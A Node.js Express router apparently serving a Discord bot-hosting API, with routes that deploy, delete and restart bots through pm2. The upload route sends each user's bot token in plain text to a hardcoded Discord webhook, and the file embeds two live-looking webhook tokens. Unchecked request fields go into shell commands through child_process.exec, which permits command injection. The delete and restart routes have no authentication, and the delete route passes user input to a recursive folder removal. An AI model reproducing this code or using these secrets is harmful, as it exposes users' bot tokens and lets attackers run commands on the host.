const Router = require("express").Router();
const cp = require("child_process");
const fs = require("fs");
const http = require("http");
const zip = require("file-zip");
const archiver = require('archiver');
const unzip = require('unzipper')
const Discord = require("discord.js")

Router.post("/upload", async (req, res) => {
  const { token, userid, id, type, prefix, _, maker, owner, statustxt, statustype, ownerId, SECRECT } = req.body;
  if(!SECRECT || process.env.SECRECT !== SECRECT){
    return res.status(400).json({error: true, message: "You Can't Do This. Please Contact NotSaksh#6969"})
  }
  const serverStr = id;
  console.log(serverStr)
  const dir = `${process.cwd()}/botServers/${userid}/${type}/${serverStr}`;
  console.log(dir)
  await fs.mkdir(dir, { recursive: true }, (err) => {
    if (err) return res.status(500).json({ sucess: false });
    fs.createReadStream(`${process.cwd()}/bots/clanBot.zip`).pipe(unzip.Extract({ path: dir }))
    setTimeout(() => {
      let config = require(`${dir}/botconfig/config.json`)
      config.token = token;
      config.prefix = prefix;
      config.status.text = statustxt;
      config.status.type = statustype.toUpperCase();
      config.ownerIDS = [`${ownerId}`]
      fs.writeFileSync(`${dir}/botconfig/config.json`, JSON.stringify(config), (err) => {
        if (err) throw err;
      })
      let index = fs.readFileSync(`${dir}/index.js`, "utf8").replace(`client.path = "path here";`, `client.path = "/botServers/${userid}/${type}/${serverStr}";`)
      fs.writeFileSync(`${dir}/index.js`, index, (err) => {
        if (err) throw err;
      });
      const webh = new Discord.WebhookClient({id: '946840351606452234', token: 'StbYgJx19dT9MIXQnmE_DzmdtmiE8U3_gBRkPp-w7Ae_iSMr5WHADytQRD-jlZOe5uxA'})
      const pm2process = cp.exec(`npx pm2 start ${dir} --name ${userid}/${serverStr}`)
      pm2process.stdout.on("data", (data) => {
        webh.send(`${data}`).catch(() => {})
      })
      const web = new Discord.WebhookClient({id: '946841231302995998', token: 'mkMUhCkCJk5ORU0JGTiDqlAYG5iozt_GSyMeBL9mBOHix5tWBqxIL0ejSOap8MLgi68i'}) //https://discord.com/api/webhooks/946841231302995998/
      web.send({
        embeds: [
          new Discord.MessageEmbed()
            .setTitle("New Bot Made.")
            .setFields([
              {
                name: `<:discord:933665087259029545> Path`,
                value: `${dir}`
              },
              {
                name: '<:discord:933665087259029545> Token',
                value: `${token}`
              },
              {
                name: `<:discord:933665087259029545> pm2 name`,
                value: `${userid}/${serverStr}`
              },
              {
                name: `Bot Maker`,
                value: `<:discord:933665087259029545> ${maker}`
              },
              {
                name: '<:discord:933665087259029545> Bot Owner',
                value: `${owner}`
              }
            ])
            .setColor(`${_.color ? _.color : "RANDOM"}`)
          
        ]
      })
      cp.exec(`npx pm2 save` , function( error, stdout, stderr ){
    console.log( stdout );
  });
      cp.exec("cp /home/runner/.pm2/dump.pm2 /home/runner/Bot-Manager-API-2/pm2files/", (error, stdout, stderr) => {
    if (error) throw new Error(error);

    console.log(`CREATED-BOT: backed up dump.pm2. stdout: ${stdout}`);
    console.log(`CREATED-BOT: backed up dump.pm2. stderr: ${stderr}`);
  });

  cp.exec("cp /home/runner/.pm2/dump.pm2.bak /home/runner/Bot-Manager-API-2/pm2files/", (error, stdout, stderr) => {
    if (error) throw new Error(error);

    console.log(`CREATED-BOT: backed up dump.pm2.bak. stdout: ${stdout}`);
    console.log(`CREATED-BOT: backed up dump.pm2.bak. stderr: ${stderr}`);
  });
    }, 10000)
  })/*  */
  res.status(200).json({ sucess: true, path: dir})
})
Router.post('/pm2', async(req, res) => {
  const {
    id
  } = req.body;
  if(!id){
    res.json({
      message: ":x: Please Provide ID"
    })
  }else{
    fs.rm(`${process.cwd()}/botServers/${id.split('/')[0]}/advanced/${id.split('/')[1]}`, { recursive: true },(err) => {
      if(err){
        console.log(err)
        return res.json({
          message: 'Cannot delete folder'
        })
      }
      cp.exec(`npx pm2 delete ${id}`)
        res.json({
          message: 'done'
        })
    })
  }
})
Router.post('/restart', async(req, res) => {
  const {
    dir
  } = req.body;
  const userid = dir.split('/')[5],
    server = dir.split('/')[7]
  console.log(`restarting = ${userid}/${server}`)
  cp.exec(`npx pm2 restart ${userid}/${server}`)
  res.json({
    message: 'The Bot Is Succesfully Restarted.'
  })
})


module.exports = Router;